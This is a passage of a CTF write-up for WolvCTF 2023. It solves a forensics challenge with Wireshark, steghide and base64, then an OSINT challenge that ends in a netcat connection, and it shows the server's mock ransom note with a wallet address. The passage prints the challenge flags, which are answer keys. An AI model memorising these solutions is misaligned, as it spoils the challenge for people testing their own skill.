&lt;p&gt;Analysing traffic with Wireshark. If we follow TCP stream we can see that the parties shared a &lt;code&gt;epicfight.png&lt;&#x2F;code&gt; file.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;wolv23&#x2F;wolv_dino1.png&quot; alt=&quot;dino trading&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Exporting FTP-DATA of the packet in which the file has been shared as &lt;code&gt;png&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;wolv23&#x2F;wolv_dino2.png&quot; alt=&quot;dino trading&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;wolv23&#x2F;wolv_dino3.png&quot; alt=&quot;dino trading&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;This is the image which was shared on network.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;wolv23&#x2F;wolv_dino4.png&quot; alt=&quot;dino trading&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Extracting data from image with &lt;code&gt;steghide&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;wolv23&#x2F;wolv_dino5.png&quot; alt=&quot;dino trading&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Reading &lt;code&gt;hidden.txt&lt;&#x2F;code&gt; and decoding it from &lt;code&gt;base64&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;wolv23&#x2F;wolv_dino6.png&quot; alt=&quot;dino trading&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : wctf{an_1mage_in_a_peecap_b64}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;wannaflag-i-an-introduction&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#wannaflag-i-an-introduction&quot; aria-label=&quot;Anchor link for: wannaflag-i-an-introduction&quot;&gt;WannaFlag I: An Introduction&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;wolv23&#x2F;wolv_wannaflag-1.png&quot; alt=&quot;wannaflag&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;This challenge is from OSINT challenge series WannaFlag.
The given image
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;wolv23&#x2F;wolv_wannaflag-11.png&quot; alt=&quot;wannaflag&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Reverse image search on google.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;wolv23&#x2F;wolv_wannaflag-12.png&quot; alt=&quot;wannaflag&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;As the challenge says &quot;read the reviews on google maps&quot;. Reading reviews of image &lt;a href=&quot;https:&#x2F;&#x2F;www.google.com&#x2F;search?q=The+Cube&amp;amp;kgmid=&#x2F;g&#x2F;1yg6ngznr&amp;amp;hl=en-GB&amp;amp;gl=GB#lrd=0x883cae3897494825:0xb2adec7980125508,1,,,,&quot;&gt;https:&#x2F;&#x2F;www.google.com&#x2F;search?q=The+Cube&amp;amp;kgmid=&#x2F;g&#x2F;1yg6ngznr&amp;amp;hl=en-GB&amp;amp;gl=GB#lrd=0x883cae3897494825:0xb2adec7980125508,1,,,,&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;wolv23&#x2F;wolv_wannaflag-13.png&quot; alt=&quot;wannaflag&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;netcat wanna-flag-i dot wolvctf dot io one three three seven&lt;&#x2F;code&gt; can be converted as &lt;code&gt;nc wanna-flag-i.wolvctf.io 1337&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;By connecting to this address we got the first part of the flag. &lt;code&gt;wctf{sp1n&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; nc wanna-flag-i.wolvctf.io 1337
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;proof-of-work:&lt;&#x2F;span&gt;&lt;span&gt; disabled ==
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Good&lt;&#x2F;span&gt;&lt;span&gt; job finding the Cube! It&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;s a favorite destination among UofM students!
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;Anyways here is the flag:
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;wctf{sp1n
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;Huh???? Where did the rest of the flag g
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;                       ______
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;                    .-&amp;quot;      &amp;quot;-.
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;                   &#x2F;            \
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;       _          |              |          _
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;      ( \         |,  .-.  .-.  ,|         &#x2F; )
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;       &amp;gt; &amp;quot;=._     | )(__&#x2F;  \__)( |     _.=&amp;quot; &amp;lt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;      (_&#x2F;&amp;quot;=._&amp;quot;=._ |&#x2F;     &#x2F;\     \| _.=&amp;quot;_.=&amp;quot;\_)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;             &amp;quot;=._ (_     ^^     _)&amp;quot;_.=&amp;quot;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;                 &amp;quot;=\__|IIIIII|__&#x2F;=&amp;quot;&amp;quot;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;                _.=&amp;quot;| \IIIIII&#x2F; |&amp;quot;=._
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;      _     _.=&amp;quot;_.=&amp;quot;\          &#x2F;&amp;quot;=._&amp;quot;=._     _
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;     ( \_.=&amp;quot;_.=&amp;quot;     `--------`     &amp;quot;=._&amp;quot;=._&#x2F; )
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;      &amp;gt; _.=&amp;quot;                            &amp;quot;=._ &amp;lt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;     (_&#x2F;                                    \_)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;                       ______
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;                    .-&amp;quot;      &amp;quot;-.
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;                   &#x2F;            \
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;       _          |              |          _
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;      ( \         |,  .-.  .-.  ,|         &#x2F; )
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;       &amp;gt; &amp;quot;=._     | )(__&#x2F;  \__)( |     _.=&amp;quot; &amp;lt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;      (_&#x2F;&amp;quot;=._&amp;quot;=._ |&#x2F;     &#x2F;\     \| _.=&amp;quot;_.=&amp;quot;\_)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;             &amp;quot;=._ (_     ^^     _)&amp;quot;_.=&amp;quot;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;                 &amp;quot;=\__|IIIIII|__&#x2F;=&amp;quot;&amp;quot;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;                _.=&amp;quot;| \IIIIII&#x2F; |&amp;quot;=._
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;      _     _.=&amp;quot;_.=&amp;quot;\          &#x2F;&amp;quot;=._&amp;quot;=._     _
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;     ( \_.=&amp;quot;_.=&amp;quot;     `--------`     &amp;quot;=._&amp;quot;=._&#x2F; )
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;      &amp;gt; _.=&amp;quot;                            &amp;quot;=._ &amp;lt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;     (_&#x2F;                                    \_)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;                       ______
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;                    .-&amp;quot;      &amp;quot;-.
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;                   &#x2F;            \
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;       _          |              |          _
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;      ( \         |,  .-.  .-.  ,|         &#x2F; )
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;       &amp;gt; &amp;quot;=._     | )(__&#x2F;  \__)( |     _.=&amp;quot; &amp;lt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;      (_&#x2F;&amp;quot;=._&amp;quot;=._ |&#x2F;     &#x2F;\     \| _.=&amp;quot;_.=&amp;quot;\_)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;             &amp;quot;=._ (_     ^^     _)&amp;quot;_.=&amp;quot;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;                 &amp;quot;=\__|IIIIII|__&#x2F;=&amp;quot;&amp;quot;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;                _.=&amp;quot;| \IIIIII&#x2F; |&amp;quot;=._
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;      _     _.=&amp;quot;_.=&amp;quot;\          &#x2F;&amp;quot;=._&amp;quot;=._     _
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;     ( \_.=&amp;quot;_.=&amp;quot;     `--------`     &amp;quot;=._&amp;quot;=._&#x2F; )
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;      &amp;gt; _.=&amp;quot;                            &amp;quot;=._ &amp;lt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;     (_&#x2F;                                    \_)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;‚ñà‚ñà‚ïó    ‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïó      ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;‚ñà‚ñà‚ïë    ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;‚ñà‚ñà‚ïë ‚ñà‚ïó ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ñà‚ïó
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù  ‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;‚ïö‚ñà‚ñà‚ñà‚ïî‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë ‚ïö‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë ‚ïö‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt; ‚ïö‚ïê‚ïê‚ïù‚ïö‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïù     ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;HAHAHHAHAHHAHA Ohhhhh man what an easy CTF to pwn
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;And I mean also really?? At least make a geo-osint KIND of difficult
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;The CTF is HOSTED by UofM where else would that dumb cube be????
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;Oh man ok well organizers if you want your &amp;quot;challenge&amp;quot; back or flags or whatever send 500,000 Goerli here:
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;0x08f5AF98610aE4B93cD0A856682E6319bF1be8a6
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;Who knows maybe we&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;ll take more flags if you don&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;t pay in time &amp;gt;:)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;#YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;#YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;#YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs #YourFlagsBelongToUs
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;                       ______
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;                    .-&amp;quot;      &amp;quot;-.
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;                   &#x2F;            \
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;       _          |              |          _
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;      ( \         |,  .-.  .-.  ,|         &#x2F; )
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;       &amp;gt; &amp;quot;=._     | )(__&#x2F;  \__)( |     _.=&amp;quot; &amp;lt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;      (_&#x2F;&amp;quot;=._&amp;quot;=._ |&#x2F;     &#x2F;\     \| _.=&amp;quot;_.=&amp;quot;\_)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;             &amp;quot;=._ (_     ^^     _)&amp;quot;_.=&amp;quot;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;                 &amp;quot;=\__|IIIIII|__&#x2F;=&amp;quot;&amp;quot;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;                _.=&amp;quot;| \IIIIII&#x2F; |&amp;quot;=._
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;      _     _.=&amp;quot;_.=&amp;quot;\          &#x2F;&amp;quot;=._&amp;quot;=._     _
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;     ( \_.=&amp;quot;_.=&amp;quot;     `--------`     &amp;quot;=._&amp;quot;=._&#x2F; )
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;      &amp;gt; _.=&amp;quot;                            &amp;quot;=._ &amp;lt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;     (_&#x2F;                                    \_)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;                       ______
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;                    .-&amp;quot;      &amp;quot;-.
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;                   &#x2F;            \
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;       _          |              |          _
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;      ( \         |,  .-.  .-.  ,|         &#x2F; )
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;       &amp;gt; &amp;quot;=._     | )(__&#x2F;  \__)( |     _.=&amp;quot; &amp;lt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;      (_&#x2F;&amp;quot;=._&amp;quot;=._ |&#x2F;     &#x2F;\     \| _.=&amp;quot;_.=&amp;quot;\_)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;             &amp;quot;=._ (_     ^^     _)&amp;quot;_.=&amp;quot;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;                 &amp;quot;=\__|IIIIII|__&#x2F;=&amp;quot;&amp;quot;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;                _.=&amp;quot;| \IIIIII&#x2F; |&amp;quot;=._
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;      _     _.=&amp;quot;_.=&amp;quot;\          &#x2F;&amp;quot;=._&amp;quot;=._     _
